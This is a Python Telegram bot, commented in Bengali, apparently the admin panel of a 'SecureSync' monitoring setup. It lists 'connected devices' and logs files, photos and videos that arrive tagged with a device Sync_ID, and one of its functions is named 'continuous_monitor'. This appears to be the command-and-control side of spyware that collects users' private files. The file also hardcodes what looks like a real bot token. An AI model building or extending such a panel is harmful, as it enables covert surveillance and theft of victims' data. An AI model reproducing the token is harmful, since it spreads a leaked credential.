import telebot
import os
import json
import time
from telebot import types
from flask import Flask
from threading import Thread

# ----------------- CONFIGURATION -----------------
TOKEN = '8608695023:AAGNCsgbo3fRjpJ4fSNfvFrmgatIVZom5Os'
ADMIN_ID = 8046944525 
bot = telebot.TeleBot(TOKEN)
DB_FILE = 'device_database.json'

# --- Render-এর জন্য ওয়েব সার্ভার (যাতে বট ২৪ ঘণ্টা জেগে থাকে) ---
app = Flask('')
@app.route('/')
def home():
    return "✅ SecureSync Admin Bot is Running!"

def run_web():
    app.run(host='0.0.0.0', port=10000)

# ----------------- BOT LOGIC -----------------
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, 'w') as f: json.dump(db, f)
    except: pass

@bot.message_handler(commands=['start', 'panel'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    db = load_db()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("📱 ডিভাইস লিস্ট", callback_data="list_devices"))
    bot.send_message(message.chat.id, f"🛡️ *Admin Dashboard Active*\nকানেক্টেড ডিভাইস: {len(db)}", 
                     parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_clicks(call):
    if call.from_user.id != ADMIN_ID: return
    db = load_db()
    if call.data == "list_devices":
        if not db:
            bot.answer_callback_query(call.id, "কানো ডিভাইস কানেক্টেড নেই।")
            return
        markup = types.InlineKeyboardMarkup()
        for dev_id, info in db.items():
            markup.add(types.InlineKeyboardButton(f"📲 Device [{dev_id}]", callback_data=f"dev_{dev_id}"))
        bot.edit_message_text("📱 *Connected User List:*", chat_id=call.message.chat.id, 
                              message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    elif call.data.startswith("dev_"):
        dev_id = call.data.split("_")[1]
        bot.answer_callback_query(call.id, f"Device {dev_id} এর ফাইল চেক করা হচ্ছে...")

@bot.message_handler(content_types=['document', 'photo', 'video'])
def continuous_monitor(message):
    caption = message.caption or ""
    if "Sync_ID:" in caption:
        try:
            dev_id = caption.split("Sync_ID:")[1].strip()
            db = load_db()
            db[dev_id] = {"last_seen": time.time()}
            save_db(db)
        except: pass

# বট এবং ওয়েব সার্ভার একসাথে চালু করা
if __name__ == "__main__":
    t = Thread(target=run_web)
    t.start()
    bot.infinity_polling()
